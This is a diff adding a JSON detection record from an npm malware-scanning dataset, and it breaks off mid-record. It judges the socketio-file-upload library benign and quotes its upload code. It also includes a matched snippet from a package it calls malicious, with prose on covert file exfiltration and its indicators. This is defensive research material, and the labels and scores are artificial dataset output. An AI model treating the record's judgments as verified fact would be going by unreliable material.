@@ -1,0 +1,1397 @@
+{
+  "package_name": "socketio-file-upload",
+  "package_version": "0.7.3",
+  "label": "benign",
+  "detection_time": "2026-05-26T20:09:50.814881",
+  "status": "success",
+  "selected_files_count": 4,
+  "selected_files": [
+    "package/package.json",
+    "package/client.js",
+    "package/client.min.js",
+    "package/server.js"
+  ],
+  "is_malicious": false,
+  "total_files": 4,
+  "malicious_files": 0,
+  "total_slices": 3,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/socketio-file-upload/0.7.3/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/socketio-file-upload/0.7.3/package/client.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "client_slice_1",
+          "code_snippet": "/*\n *                 Copyright (C) 2015 Shane Carr and others\n *                               X11 License\n *\n * Permission is hereby granted, free of charge, to any person obtaining a\n * copy of this software and associated documentation files (the \"Software\"),\n * to deal in the Software without restriction, including without limitation\n * the rights to use, copy, modify, merge, publish, distribute, sublicense,\n * and/or sell copies of the Software, and to permit persons to whom the\n * Software is furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\n * DEALINGS IN THE SOFTWARE.\n *\n * Except as contained in this notice, the names of the authors or copyright\n * holders shall not be used in advertising or otherwise to promote the sale,\n * use or other dealings in this Software without prior written authorization\n * from the authors or copyright holders.\n */\n\n// Do not check function indentation because this is intentionally ignored in order to preserve history in git.\n/* eslint-disable indent */\n\n/*\n * A client-side JavaScript object to handle file uploads to a Node.JS server\n * via Socket.IO.\n * @implements EventTarget\n * @param {SocketIO} socket The current Socket.IO connection.\n */\n(function (scope, name, factory) {\n\t/* eslint-disable no-undef */\n\tif (typeof define === \"function\" && define.amd) {\n\t\tdefine([], factory);\n\t}\n\telse if (typeof module === \"object\" && module.exports) {\n\t\tmodule.exports = factory();\n\t}\n\telse {\n\t\tscope[name] = factory();\n\t}\n\t/* eslint-enable no-undef */\n}(this, \"SocketIOFileUpload\", function () {\n return function (socket, options) {\n\t\"use strict\";\n\n\tvar self = this; // avoids context issues\n\n\t// Check for compatibility\n\tif (!window.File || !window.FileReader) {\n\t\tthrow new Error(\"Socket.IO File Upload: Browser Not Supported\");\n\t}\n\n\tif ( !window.siofu_global ) {\n\t\twindow.siofu_global = {\n\t\t\tinstances: 0,\n\t\t\tdownloads: 0\n\t\t};\n\t}\n\n\t// Private and Public Variables\n\tvar callbacks = {},\n\t\tuploadedFiles = {},\n\t\tchunkCallbacks = {},\n\t\treadyCallbacks = {},\n\t\tcommunicators = {};\n\n\tvar _getOption = function (key, defaultValue) {\n\t\tif(!options) {\n\t\t\treturn defaultValue;\n\t\t}\n\t\treturn options[key] || defaultValue;\n\t};\n\n\tself.fileInputElementId = \"siofu_input_\"+window.siofu_global.instances++;\n\tself.resetFileInputs = true;\n\tself.useText = _getOption(\"useText\", false);\n\tself.serializedOctets = _getOption(\"serializedOctets\", false);\n\tself.useBuffer = _getOption(\"useBuffer\", true);\n\tself.chunkSize = _getOption(\"chunkSize\", 1024 * 100); // 100kb default chunk size\n\tself.topicName = _getOption(\"topicName\", \"siofu\");\n\n\t/**\n\t* WrapData allow you to wrap the Siofu messages into a predefined format.\n\t* You can then easily use Siofu packages even in strongly typed topic.\n\t* wrapData can be a boolean or an object. It is false by default.\n\t* If wrapData is true it will allow you to send all the messages to only one topic by wrapping the siofu actions and messages.\n\t*\n\t* ex:\n\t{\n\t\taction: 'complete',\n\t\tmessage: {\n\t\t id: id,\n\t\t success: success,\n\t\t detail: fileInfo.clientDetail\n\t\t}\n\t}\n\t*\n\t* If wrapData is an object constituted of two mandatory key and one optional:\n\t* wrapKey and unwrapKey (mandatory): Corresponding to the key used to wrap the siofu data and message\n\t* additionalData (optional): Corresponding to the data to send along with file data\n\t*\n\t* ex:\n\t* if wrapData = {\n\t\twrapKey: {\n\t\t\taction: 'actionType',\n\t\t\tmessage: 'data'\n\t\t},\n\t\tunwrapKey: {\n\t\t\taction: 'actionType',\n\t\t\tmessage: 'message'\n\t\t},\n\t\tadditionalData: {\n\t\t\tacknowledgement: true\n\t\t}\n\t\t}\n\t* When Siofu will send for example a complete message this will send:\n\t*\n\t{\n\t\tacknowledgement: true,\n\t\tactionType: 'complete',\n\t\tdata: {\n\t\t id: id,\n\t\t success: success,\n\t\t detail: fileInfo.clientDetail\n\t\t}\n\t}\n\t* and it's waiting from client data formatted like this:\n\t*\n\t{\n\t\tactionType: '...',\n\t\tmessage: {...}\n\t}\n\t* /!\\ If wrapData is wrong configured is interpreted as false /!\\\n\t*/\n\tself.wrapData = _getOption(\"wrapData\", false);\n\n\tvar _isWrapDataWellConfigured = function () {\n\t\tif (typeof self.wrapData === \"boolean\") {\n\t\t\treturn true;\n\t\t}\n\t\tif (typeof self.wrapData !== \"object\" || Array.isArray(self.wrapData)) {\n\t\t\treturn false;\n\t\t}\n\n\t\tif(!self.wrapData.wrapKey || typeof self.wrapData.wrapKey.action !== \"string\" || typeof self.wrapData.wrapKey.message !== \"string\" ||\n\t\t\t!self.wrapData.unwrapKey || typeof self.wrapData.unwrapKey.action !== \"string\" || typeof self.wrapData.unwrapKey.message !== \"string\") {\n\t\t\treturn false;\n\t\t}\n\n\t\treturn true;\n\t};\n\n\n\t/**\n\t * Allow user to access to some private function to customize message reception.\n\t * This is used if you specified wrapOptions on the client side and have to manually bind message to callback.\n\t */\n\tself.exposePrivateFunction = _getOption(\"exposePrivateFunction\", false);\n\n\tvar _getTopicName = function (topicExtension) {\n\t\tif (self.wrapData) {\n\t\t\treturn self.topicName;\n\t\t}\n\n\t\treturn self.topicName + topicExtension;\n\t};\n\n\tvar _wrapData = function (data, action) {\n\t\tif(!_isWrapDataWellConfigured() || !self.wrapData) {\n\t\t\treturn data;\n\t\t}\n\t\tvar dataWrapped = {};\n\t\tif(self.wrapData.additionalData) {\n\t\t\tObject.assign(dataWrapped, self.wrapData.additionalData);\n\t\t}\n\n\t\tvar actionKey = self.wrapData.wrapKey && typeof self.wrapData.wrapKey.action === \"string\" ? self.wrapData.wrapKey.action : \"action\";\n\t\tvar messageKey = self.wrapData.wrapKey && typeof self.wrapData.wrapKey.message === \"string\" ? self.wrapData.wrapKey.message : \"message\";\n\n\t\tdataWrapped[actionKey] = action;\n\t\tdataWrapped[messageKey] = data;\n\t\treturn dataWrapped;\n\t};\n\n\t/**\n\t * Private method to dispatch a custom event on the instance.\n\t * @param  {string} eventName  Name for which listeners can listen.\n\t * @param  {object} properties An object literal with additional properties\n\t *                             to be attached to the event object.\n\t * @return {boolean} false if any callback returned false; true otherwise\n\t */\n\tvar _dispatch = function (eventName, properties) {\n\t\tvar evnt = document.createEvent(\"Event\");\n\t\tevnt.initEvent(eventName, false, false);\n\t\tfor (var prop in properties) {\n\t\t\tif (properties.hasOwnProperty(prop)) {\n\t\t\t\tevnt[prop] = properties[prop];\n\t\t\t}\n\t\t}\n\t\treturn self.dispatchEvent(evnt);\n\t};\n\n\t/**\n\t * Private method to bind an event listener.  Useful to ensure that all\n\t * events have been unbound.  Inspired by Backbone.js.\n\t */\n\tvar _listenedReferences = [];\n\tvar _listenTo = function (object, eventName, callback, bubble) {\n\t\tobject.addEventListener(eventName, callback, bubble);\n\t\t_listenedReferences.push(arguments);\n\t};\n\tvar _stopListeningTo = function (object, eventName, callback, bubble) {\n\t\tif (object.removeEventListener) {\n\t\t\tobject.removeEventListener(eventName, callback, bubble);\n\t\t}\n\t};\n\tvar _stopListening = function () {\n\t\tfor (var i = _listenedReferences.length - 1; i >= 0; i--) {\n\t\t\t_stopListeningTo.apply(this, _listenedReferences[i]);\n\t\t}\n\t\t_listenedReferences = [];\n\t};\n\n\t/**\n\t * Private closure for the _load function.\n\t * @param  {File} file A W3C File object\n\t * @return {void}\n\t */\n\tvar _loadOne = function (file) {\n\t\t// First check for file size\n\t\tif (self.maxFileSize !== null && file.size > self.maxFileSize) {\n\t\t\t_dispatch(\"error\", {\n\t\t\t\tfile: file,\n\t\t\t\tmessage: \"Attempt by client to upload file exceeding the maximum file size\",\n\t\t\t\tcode: 1\n\t\t\t});\n\t\t\treturn;\n\t\t}\n\n\t\t// Dispatch an event to listeners and stop now if they don't want\n\t\t// this file to be uploaded.\n\t\tvar evntResult = _dispatch(\"start\", {\n\t\t\tfile: file\n\t\t});\n\t\tif (!evntResult) return;\n\n\t\t// Scope variables\n\t\tvar reader = new FileReader(),\n\t\t\tid = window.siofu_global.downloads++,\n\t\t\tuploadComplete = false,\n\t\t\tuseText = self.useText,\n\t\t\toffset = 0,\n\t\t\tnewName;\n\t\tif (reader._realReader) reader = reader._realReader; // Support Android Crosswalk\n\t\tuploadedFiles[id] = file;\n\n\t\t// An object for the outside to use to communicate with us\n\t\tvar communicator = { id: id };\n\n\t\t// Calculate chunk size\n\t\tvar chunkSize = self.chunkSize;\n\t\tif (chunkSize >= file.size || chunkSize <= 0) chunkSize = file.size;\n\n\t\t// Private function to handle transmission of file data\n\t\tvar transmitPart = function (start, end, content) {\n\t\t\tvar isBase64 = false;\n\t\t\tif (!useText) {\n\t\t\t\ttry {\n\t\t\t\t\tvar uintArr = new Uint8Array(content);\n\n\t\t\t\t\t// Support the transmission of serialized ArrayBuffers\n\t\t\t\t\t// for experimental purposes, but default to encoding the\n\t\t\t\t\t// transmission in Base 64.\n\t\t\t\t\tif (self.serializedOctets) {\n\t\t\t\t\t\tcontent = uintArr;\n\t\t\t\t\t}\n\t\t\t\t\telse if (self.useBuffer) {\n\t\t\t\t\t\tcontent = uintArr.buffer;\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tisBase64 = true;\n\t\t\t\t\t\tcontent = _uint8ArrayToBase64(uintArr);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tcatch (error) {\n\t\t\t\t\tsocket.emit(_getTopicName(\"_done\"), _wrapData({\n\t\t\t\t\t\tid: id,\n\t\t\t\t\t\tinterrupt: true\n\t\t\t\t\t}, \"done\"));\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// TODO override the send data\n\t\t\tsocket.emit(_getTopicName(\"_progress\"), _wrapData({\n\t\t\t\tid: id,\n\t\t\t\tsize: file.size,\n\t\t\t\tstart: start,\n\t\t\t\tend: end,\n\t\t\t\tcontent: content,\n\t\t\t\tbase64: isBase64\n\t\t\t}, \"progress\"));\n\t\t};\n\n\t\t// Callback when tranmission is complete.\n\t\tvar transmitDone = function () {\n\t\t\tsocket.emit(_getTopicName(\"_done\"), _wrapData({\n\t\t\t\tid: id\n\t\t\t}, \"done\"));\n\t\t};\n\n\t\t// Load a \"chunk\" of the file from offset to offset+chunkSize.\n\t\t//\n\t\t// Note that FileReader has its own \"progress\" event.  However,\n\t\t// it has not proven to be reliable enough for production. See\n\t\t// Stack Overflow question #16713386.\n\t\t//\n\t\t// To compensate, we will manually load the file in chunks of a\n\t\t// size specified by the user in the uploader.chunkSize property.\n\t\tvar processChunk = function () {\n\t\t\t// Abort if we are told to do so.\n\t\t\tif (communicator.abort) return;\n\n\t\t\tvar chunk = file.slice(offset, Math.min(offset+chunkSize, file.size));\n\t\t\tif (useText) {\n\t\t\t\treader.readAsText(chunk);\n\t\t\t}\n\t\t\telse {\n\t\t\t\treader.readAsArrayBuffer(chunk);\n\t\t\t}\n\t\t};\n\n\t\t// Callback for when the reader has completed a load event.\n\t\tvar loadCb = function (event) {\n\t\t\t// Abort if we are told to do so.\n\t\t\tif (communicator.abort) return;\n\n\t\t\t// Transmit the newly loaded data to the server and emit a client event\n\t\t\tvar bytesLoaded = Math.min(offset+chunkSize, file.size);\n\t\t\ttransmitPart(offset, bytesLoaded, event.target.result);\n\t\t\t_dispatch(\"progress\", {\n\t\t\t\tfile: file,\n\t\t\t\tbytesLoaded: bytesLoaded,\n\t\t\t\tname: newName\n\t\t\t});\n\n\t\t\t// Get ready to send the next chunk\n\t\t\toffset += chunkSize;\n\t\t\tif (offset >= file.size) {\n\t\t\t\t// All done!\n\t\t\t\ttransmitDone();\n\t\t\t\t_dispatch(\"load\", {\n\t\t\t\t\tfile: file,\n\t\t\t\t\treader: reader,\n\t\t\t\t\tname: newName\n\t\t\t\t});\n\t\t\t\tuploadComplete = true;\n\t\t\t}\n\t\t};\n\t\t_listenTo(reader, \"load\", loadCb);\n\n\t\t// Listen for an \"error\" event.  Stop the transmission if one is received.\n\t\t_listenTo(reader, \"error\", function () {\n\t\t\tsocket.emit(_getTopicName(\"_done\"), _wrapData({\n\t\t\t\tid: id,\n\t\t\t\tinterrupt: true\n\t\t\t}, \"done\"));\n\t\t\t_stopListeningTo(reader, \"load\", loadCb);\n\t\t});\n\n\t\t// Do the same for the \"abort\" event.\n\t\t_listenTo(reader, \"abort\", function () {\n\t\t\tsocket.emit(_getTopicName(\"_done\"), _wrapData({\n\t\t\t\tid: id,\n\t\t\t\tinterrupt: true\n\t\t\t}, \"done\"));\n\t\t\t_stopListeningTo(reader, \"load\", loadCb);\n\t\t});\n\n\t\t// Transmit the \"start\" message to the server.\n\t\tsocket.emit(_getTopicName(\"_start\"), _wrapData({\n\t\t\tname: file.name,\n\t\t\tmtime: file.lastModified,\n\t\t\tmeta: file.meta,\n\t\t\tsize: file.size,\n\t\t\tencoding: useText ? \"text\" : \"octet\",\n\t\t\tid: id\n\t\t}, \"start\"));\n\n\t\t// To avoid a race condition, we don't want to start transmitting to the\n\t\t// server until the server says it is ready.\n\t\tvar readyCallback = function (_newName) {\n\t\t\tnewName = _newName;\n\t\t\tprocessChunk();\n\t\t};\n\t\tvar chunkCallback = function(){\n\t\t\tif ( !uploadComplete )\n\t\t\t\tprocessChunk();\n\t\t};\n\t\treadyCallbacks[id] = readyCallback;\n\t\tchunkCallbacks[id] = chunkCallback;\n\n\t\treturn communicator;\n\t};\n\n\t/**\n\t * Private function to load the file into memory using the HTML5 FileReader object\n\t * and then transmit that file through Socket.IO.\n\t *\n\t * @param  {FileList} files An array of files\n\t * @return {void}\n\t */\n\tvar _load = function (files) {\n\t\t// Iterate through the array of files.\n\t\tfor (var i = 0; i < files.length; i++) {\n\t\t\t// Evaluate each file in a closure, because we will need a new\n\t\t\t// instance of FileReader for each file.\n\t\t\tvar communicator = _loadOne(files[i]);\n\t\t\tcommunicators[communicator.id] = communicator;\n\t\t}\n\t};\n\n\t/**\n\t * Private function to fetch an HTMLInputElement instance that can be used\n\t * during the file selection process.\n\t * @return {void}\n\t */\n\tvar _getInputElement = function () {\n\t\tvar inpt = document.getElementById(self.fileInputElementId);\n\t\tif (!inpt) {\n\t\t\tinpt = document.createElement(\"input\");\n\t\t\tinpt.setAttribute(\"type\", \"file\");\n\t\t\tinpt.setAttribute(\"id\", self.fileInputElementId);\n\t\t\tinpt.style.display = \"none\";\n\t\t\tdocument.body.appendChild(inpt);\n\t\t}\n\t\treturn inpt;\n\t};\n\n\t/**\n\t * Private function to remove an HTMLInputElement created by this instance\n\t * of SIOFU.\n\t *\n\t * @return {void}\n\t */\n\tvar _removeInputElement = function () {\n\t\tvar inpt = document.getElementById(self.fileInputElementId);\n\t\tif (inpt) {\n\t\t\tinpt.parentNode.removeChild(inpt);\n\t\t}\n\t};\n\n\tvar _baseFileSelectCallback = function (files) {\n\t\tif (files.length === 0) return;\n\n\t\t// Ensure existence of meta property on each file\n\t\tfor (var i = 0; i < files.length; i++) {\n\t\t\tif(!files[i].meta) files[i].meta = {};\n\t\t}\n\n\t\t// Dispatch the \"choose\" event\n\t\tvar evntResult = _dispatch(\"choose\", {\n\t\t\tfiles: files\n\t\t});\n\n\t\t// If the callback didn't return false, continue with the upload\n\t\tif (evntResult) {\n\t\t\t_load(files);\n\t\t}\n\t};\n\n\t/**\n\t * Private function that serves as a callback on file input.\n\t * @param  {Event} event The file input change event\n\t * @return {void}\n\t */\n\tvar _fileSelectCallback = function (event) {\n\t\tvar files = event.target.files || event.dataTransfer.files;\n\t\tevent.preventDefault();\n\t\t_baseFileSelectCallback(files);\n\n\t\tif (self.resetFileInputs) {\n\t\t\ttry {\n\t\t\t\tevent.target.value = \"\"; //for IE11, latest Chrome/Firefox/Opera...\n\t\t\t} catch(err) {\n\t\t\t\t// ignore\n\t\t\t}\n\t\t\tif (event.target.value) { //for IE5 ~ IE10\n\t\t\t\tvar form = document.createElement(\"form\"),\n\t\t\t\tparentNode = event.target.parentNode, ref = event.target.nextSibling;\n\t\t\t\tform.appendChild(event.target);\n\t\t\t\tform.reset();\n\t\t\t\tparentNode.insertBefore(event.target, ref);\n\t\t\t}\n\t\t}\n\t};\n\n\n\t/**\n\t * Submit files at arbitrary time\n\t * @param {FileList} files Files received form the input element.\n\t * @return {void}\n\t */\n\tthis.submitFiles = function (files) {\n\t\tif (files) {\n\t\t\t_baseFileSelectCallback(files);\n\t\t}\n\t};\n\n\t/**\n\t * Use a submitButton to upload files from the field given\n\t * @param {HTMLInputElement} submitButton the button that the user has to\n\t *                           click to start the upload\n\t * @param {HTMLInputElement} input the field with the data to upload\n\t *\n\t * @return {void}\n\t */\n\tthis.listenOnSubmit = function (submitButton, input) {\n\t\tif (!input.files) return;\n\t\t_listenTo(submitButton, \"click\", function () {\n\t\t\t_baseFileSelectCallback(input.files);\n\t\t}, false);\n\t};\n\n\t/**\n\t * Use a submitButton to upload files from the field given\n\t * @param {HTMLInputElement} submitButton the button that the user has to\n\t *                           click to start the upload\n\t * @param {Array} array an array of fields with the files to upload\n\t *\n\t * @return {void}\n\t */\n\tthis.listenOnArraySubmit = function (submitButton, array) {\n\t\tfor (var index in array) {\n\t\t\tthis.listenOnSubmit(submitButton, array[index]);\n\t\t}\n\t};\n\n\t/**\n\t * Use a file input to activate this instance of the file uploader.\n\t * @param  {HTMLInputElement} inpt The input element (e.g., as returned by\n\t *                                 document.getElementById(\"yourId\"))\n\t * @return {void}\n\t */\n\tthis.listenOnInput = function (inpt) {\n\t\tif (!inpt.files) return;\n\t\t_listenTo(inpt, \"change\", _fileSelectCallback, false);\n\t};\n\n\t/**\n\t * Accept files dropped on an element and upload them using this instance\n\t * of the file uploader.\n\t * @param  {HTMLELement} div Any HTML element.  When the user drags a file\n\t *                           or files onto this element, those files will\n\t *                           be processed by the instance.\n\t * @return {void}\n\t */\n\tthis.listenOnDrop = function (div) {\n\t\t// We need to preventDefault on the dragover event in order for the\n\t\t// drag-and-drop operation to work.\n\t\t_listenTo(div, \"dragover\", function (event) {\n\t\t\tevent.preventDefault();\n\t\t}, false);\n\n\t\t_listenTo(div, \"drop\", _fileSelectCallback);\n\t};\n\n\t/**\n\t * Display a dialog box for the user to select a file.  The file will then\n\t * be uploaded using this instance of SocketIOFileUpload.\n\t *\n\t * This method works in all current browsers except Firefox, though Opera\n\t * requires that the input element be visible.\n\t *\n\t * @return {void}\n\t */\n\tthis.prompt = function () {\n\t\tvar inpt = _getInputElement();\n\n\t\t// Listen for the \"change\" event on the file input element.\n\t\t_listenTo(inpt, \"change\", _fileSelectCallback, false);\n\n\t\t// Fire a click event on the input element.  Firefox does not allow\n\t\t// programatic clicks on input elements, but the other browsers do.\n\t\t// Note that Opera requires that the element be visible when \"clicked\".\n\t\tvar evnt = document.createEvent(\"MouseEvents\");\n\t\tevnt.initMouseEvent(\"click\", true, true, window,\n\t\t\t0, 0, 0, 0, 0, false, false, false, false, 0, null);\n\t\tinpt.dispatchEvent(evnt);\n\t};\n\n\t/**\n\t * Destroy an instance of Socket.IO file upload (i.e., unbind events and\n\t * relieve memory).\n\t *\n\t * IMPORTANT: To finish the memory relief process, set all external\n\t * references to this instance of SIOFU (including the reference used to\n\t * call this destroy function) to null.\n\t *\n\t * @return {void}\n\t */\n\tthis.destroy = function () {\n\t\t_stopListening();\n\t\t_removeInputElement();\n\t\tfor (var id in communicators) {\n\t\t\tif (communicators.hasOwnProperty(id)) {\n\t\t\t\tcommunicators[id].abort = true;\n\t\t\t}\n\t\t}\n\t\tcallbacks = null, uploadedFiles = null, readyCallbacks = null, communicators = null;\n\t};\n\n\t/**\n\t * Registers an event listener.  If the callback function returns false,\n\t * the file uploader will stop uploading the current file.\n\t * @param  {string}   eventName Type of event for which to listen.\n\t * @param  {Function} callback  Listener function.  Will be passed the\n\t *                              event as an argument when the event occurs.\n\t * @return {void}\n\t */\n\tthis.addEventListener = function (eventName, callback) {\n\t\tif (!callbacks[eventName]) callbacks[eventName] = [];\n\t\tcallbacks[eventName].push(callback);\n\t};\n\n\t/**\n\t * Removes an event listener.\n\t * @param  {string}   eventName Type of event.\n\t * @param  {Function} callback  Listener function to remove.\n\t * @return {boolean}            true if callback removed; false otherwise\n\t */\n\tthis.removeEventListener = function (eventName, callback) {\n\t\tif (!callbacks[eventName]) return false;\n\t\tfor (var i = 0; i < callbacks[eventName].length; i++) {\n\t\t\tif (callbacks[eventName][i] === callback) {\n\t\t\t\tcallbacks[eventName].splice(i, 1);\n\t\t\t\treturn true;\n\t\t\t}\n\t\t}\n\t\treturn false;\n\t};\n\n\t/**\n\t * Dispatches an event into this instance's event model.\n\t * @param  {Event} evnt The event to dispatch.\n\t * @return {boolean} false if any callback returned false; true otherwise\n\t */\n\tthis.dispatchEvent = function (evnt) {\n\t\tvar eventCallbacks = callbacks[evnt.type];\n\t\tif (!eventCallbacks) return true;\n\t\tvar retVal = true;\n\t\tfor (var i = 0; i < eventCallbacks.length; i++) {\n\t\t\tvar callbackResult = eventCallbacks[i](evnt);\n\t\t\tif (callbackResult === false) {\n\t\t\t\tretVal = false;\n\t\t\t}\n\t\t}\n\t\treturn retVal;\n\t};\n\n\t// OTHER LIBRARIES\n\t/*\n\t * base64-arraybuffer\n\t * https://github.com/niklasvh/base64-arraybuffer\n\t *\n\t * Copyright (c) 2012 Niklas von Hertzen\n\t * Licensed under the MIT license.\n\t *\n\t * Adapted for SocketIOFileUpload.\n\t */\n\tvar _uint8ArrayToBase64 = function (bytes) {\n\t\tvar i, len = bytes.buffer.byteLength, base64 = \"\",\n\t\t\tchars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n\n\t\tfor (i = 0; i < len; i += 3) {\n\t\t\tbase64 += chars[bytes[i] >> 2];\n\t\t\tbase64 += chars[((bytes[i] & 3) << 4) | (bytes[i + 1] >> 4)];\n\t\t\tbase64 += chars[((bytes[i + 1] & 15) << 2) | (bytes[i + 2] >> 6)];\n\t\t\tbase64 += chars[bytes[i + 2] & 63];\n\t\t}\n\n\t\tif ((len % 3) === 2) {\n\t\t\tbase64 = base64.substring(0, base64.length - 1) + \"=\";\n\t\t}\n\t\telse if (len % 3 === 1) {\n\t\t\tbase64 = base64.substring(0, base64.length - 2) + \"==\";\n\t\t}\n\n\t\treturn base64;\n\t};\n\t// END OTHER LIBRARIES\n\tvar _chunckCallback = function(data) {\n\t\tif ( chunkCallbacks[data.id] )\n\t\t\tchunkCallbacks[data.id]();\n\t};\n\n\tvar _readyCallback = function (data) {\n\t\tif (readyCallbacks[data.id])\n\t\t\treadyCallbacks[data.id](data.name);\n\t};\n\n\tvar _completCallback = function (data) {\n\t\tif (uploadedFiles[data.id]) {\n\t\t\t_dispatch(\"complete\", {\n\t\t\t\tfile: uploadedFiles[data.id],\n\t\t\t\tdetail: data.detail,\n\t\t\t\tsuccess: data.success\n\t\t\t});\n\t\t}\n\t};\n\n\tvar _errorCallback = function (data) {\n\t\tif ( uploadedFiles[data.id] ) {\n\t\t\t_dispatch(\"error\", {\n\t\t\t\tfile: uploadedFiles[data.id],\n\t\t\t\tmessage: data.message,\n\t\t\t\tcode: 0\n\t\t\t});\n\t\t\tif (communicators) communicators[data.id].abort = true;\n\t\t}\n\t};\n\n\t// CONSTRUCTOR: Listen to the \"complete\", \"ready\", and \"error\" messages\n\t// on the socket.\n\tif (_isWrapDataWellConfigured() && self.wrapData) {\n\t\tvar mapActionToCallback = {\n\t\t\tchunk: _chunckCallback,\n\t\t\tready: _readyCallback,\n\t\t\tcomplete: _completCallback,\n\t\t\terror: _errorCallback\n\t\t};\n\n\t\t_listenTo(socket, _getTopicName(), function (message) {\n\t\t\tif (typeof message !== \"object\") {\n\t\t\t\tconsole.log(\"SocketIOFileUploadClient Error: You choose to wrap your data so the message from the server need to be an object\"); // eslint-disable-line no-console\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tvar actionKey = self.wrapData.unwrapKey && typeof self.wrapData.unwrapKey.action === \"string\" ? self.wrapData.unwrapKey.action : \"action\";\n\t\t\tvar messageKey = self.wrapData.unwrapKey && typeof self.wrapData.unwrapKey.message === \"string\" ? self.wrapData.unwrapKey.message : \"message\";\n\n\t\t\tvar action = message[actionKey];\n\t\t\tvar data = message[messageKey];\n\t\t\tif (!action || !data || !mapActionToCallback[action]) {\n\t\t\t\tconsole.log(\"SocketIOFileUploadClient Error: You choose to wrap your data but the message from the server is wrong configured. Check the message and your wrapData option\"); // eslint-disable-line no-console\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tmapActionToCallback[action](data);\n\t\t});\n\t} else {\n\t\t_listenTo(socket, _getTopicName(\"_chunk\"), _chunckCallback);\n\t\t_listenTo(socket, _getTopicName(\"_ready\"), _readyCallback);\n\t\t_listenTo(socket, _getTopicName(\"_complete\"), _completCallback);\n\t\t_listenTo(socket, _getTopicName(\"_error\"), _errorCallback);\n\t}\n\n\tif (this.exposePrivateFunction) {\n\t\tthis.chunckCallback = _chunckCallback;\n\t\tthis.readyCallback = _readyCallback;\n\t\tthis.completCallback = _completCallback;\n\t\tthis.errorCallback = _errorCallback;\n\t}\n };\n}));",
+          "is_malicious": false,
+          "malice_score": 0.48997451066970826,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses browser File and FileReader APIs to read user-selected files in chunks, encodes file data (optionally in base64), and sends these chunks over a Socket.IO network connection using socket.emit. It manages file upload lifecycle events (start, progress, complete, error) and supports wrapping messages in custom formats before transmission. This enables client-side file upload functionality to a Node.js server, facilitating potentially large file exfiltration over the network.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a client-side JavaScript library designed to facilitate file uploads over a Socket.IO connection. It uses standard browser APIs (File, FileReader) to read user-selected files in chunks and transmits these chunks to a server. While it does enable file data transmission over the network, this is an expected and legitimate behavior for a file upload utility. There is no obfuscation, no hidden or unauthorized data collection, no execution of arbitrary code, and no evidence of exfiltration to unknown or attacker-controlled endpoints. The code explicitly manages upload lifecycle events and supports customization of message wrapping, which is typical for a reusable library. Compared to the known malicious patterns, this code lacks key indicators such as obfuscated payloads, eval execution, system data collection, or hardcoded suspicious endpoints. The use of socket.emit to send file chunks is consistent with its stated purpose and not inherently malicious. Therefore, despite some superficial similarity in transmitting file data, the intent and context are benign.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_113501_068589_snippet_1",
+              "source_package": "akiraa-wb (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_068589/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.508599042892456,
+              "code_similarity": 0.36995232105255127,
+              "behavior_similarity": 0.6472457647323608,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const createFormData = (_0x28481b, _0x199329, _0xd1715e) => {\n  const { mime: _0xb2cb19 } = fromBuffer(_0x28481b) || {},\n    _0x1881ee = new FormData();\n  return (\n    _0x1881ee.append(_0x199329, _0x28481b, randomBytes + '.' + _0xd1715e),\n    _0x1881ee\n  );\n};",
+                "code_behavior": "At runtime, the code creates a multipart form-data object from arbitrary file buffers, attaches a randomized filename, and prepares the data for upload to external services, enabling covert file exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "This function is designed to package arbitrary file data for upload, which is not expected in a WhatsApp automation tool and enables unauthorized data exfiltration.",
+                  "violated_expectations": "Normal WhatsApp automation scripts do not require arbitrary file exfiltration or form-data creation for external uploads, especially without user consent.",
+                  "similar_legitimate_use": "Legitimate file upload utilities or cloud storage clients may use similar code, but only with explicit user action and consent.",
+                  "key_indicators": [
+                    "Automated creation of form-data from arbitrary file buffers",
+                    "Randomized filenames to obscure file origin",
+                    "Preparation of data for network exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main package file (obfuscated JavaScript)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "akiraa-wb",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (latest released <1 year ago)",
+                  "why_malicious": "The package contains obfuscated JavaScript code that, at runtime, exfiltrates user files to multiple hardcoded external file-sharing services without user consent. It automates unauthorized data uploads to suspicious endpoints, using randomized filenames and evasion techniques, making it a tool for covert data exfiltration and a clear indicator of compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Prepare file data for upload by creating form-data with randomized filenames.",
